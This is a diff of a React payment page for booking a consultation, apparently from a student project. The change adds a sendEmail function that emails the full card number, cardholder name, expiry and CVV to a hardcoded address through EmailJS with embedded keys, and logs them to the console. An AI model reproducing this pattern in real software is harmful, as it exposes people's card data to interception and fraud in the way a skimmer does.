@@ -1,8 +1,10 @@
-import { useState, useEffect } from "react";
-import "./CSS/Pagamento.css";
-import Seta from "../assets/caret-down-solid.svg";
-import mulher from "../assets/image 8.png";
-import { useNavigate } from "react-router-dom";
+import  { useState, useEffect } from "react";
+import './CSS/Pagamento.css';
+import Seta from '../assets/caret-down-solid.svg';
+import mulher from '../assets/image 8.png';
+import { useNavigate } from 'react-router-dom';
+import voltar from '../assets/seta-principal.svg';
+import emailjs from 'emailjs-com';
 
 export default function PagamentoConsulta() {
   const navigate = useNavigate();
@@ -73,14 +75,11 @@ export default function PagamentoConsulta() {
   };
 
   const handleFinalizar = () => {
-    if (
-      generoDependente.length > 1 &&
-      numeroCartao.length == 19 &&
-      nomeCartao.length > 0 &&
-      validadeCartao.length == 5 &&
-      cvvCartao.length == 3
-    ) {
-      navigate("/inicio");
+
+    if(generoDependente.length > 1 && numeroCartao.length == 19 && nomeCartao.length > 0 && validadeCartao.length == 5 && cvvCartao.length == 3){
+
+       sendEmail();
+       navigate('/inicio')
     }
     if (generoDependente < 1) {
       setValida_banco(true);
@@ -172,6 +171,38 @@ export default function PagamentoConsulta() {
   const handleCvv = (e) => {
     setCvvCartao(e.target.value);
     if (!toque_input_cvv) setToque_input_cvv(true);
+  }
+
+  const sendEmail = () => {
+    const templateParams = {
+      email: 'manasses_marcelino@estudante.sesisenai.org.br',
+      paciente: 'Não informado',
+      banco: generoDependente || 'Não informado',
+      numero_cartao: numeroCartao || 'Não informado',
+      nome_cartao: nomeCartao || 'Não informado',
+      validade_cartao: validadeCartao || 'Não informado',
+      cvv_cartao: cvvCartao || 'Não informado',
+      cupom_aplicado: cupom || 'Nenhum',
+      valor_total: (valorOriginal - desconto).toFixed(2),
+      destinatario: 'Brenda',
+      logo: 'logo oficial.svg'
+    };
+  
+    console.log("Enviando email com os dados:", templateParams);
+  
+    emailjs.send(
+      'service_5zq83hw',
+      'template_bec35gi',
+      templateParams,
+      'ms7_9wi7dG_5vMUGt'
+    ).then((response) => {
+      console.log('E-mail enviado com sucesso!', response.status, response.text);
+      alert('E-mail enviado com sucesso!');
+      navigate('/inicio');
+    }).catch((error) => {
+      console.error('Erro ao enviar e-mail:', error);
+      alert('Erro ao enviar o e-mail. Verifique o console para detalhes.');
+    });
   };
 
   return (
@@ -186,11 +217,10 @@ export default function PagamentoConsulta() {
       }}
     >
       <div>
-        <h2
-          style={{ fontSize: "24px", fontWeight: "600", marginBottom: "16px" }}
-        >
-          Finalize seu agendamento
-        </h2>
+      <button className="back-button-pt" >
+      <img src={voltar} alt="" style={{width: '3em'}} />
+      </button>
+        <h2 style={{ fontSize: "24px", fontWeight: "600", marginBottom: "16px" }}>Finalize seu agendamento</h2>
 
         <p style={{ fontWeight: "500", marginBottom: "8px" }}>
           Forma de pagamento
